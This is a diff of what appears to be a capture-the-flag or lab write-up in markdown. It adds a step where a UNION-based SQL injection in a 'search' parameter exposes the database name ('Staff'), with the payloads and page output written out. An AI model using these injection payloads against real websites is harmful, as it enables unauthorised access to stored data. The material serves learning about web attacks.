@@ -20,5 +20,13 @@ search=killer' UNION SELECT 1,2,3,4,5,6-- -
 ```
 ```
 <h3>Search results </h3>
-ID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>
+ID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
+```
+## show database
+```
+search=killer' UNION SELECT database(),2,3,4,5,6-- -
+```
+```
+<h3>Search results </h3> 
+ID: Staff<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
 ```
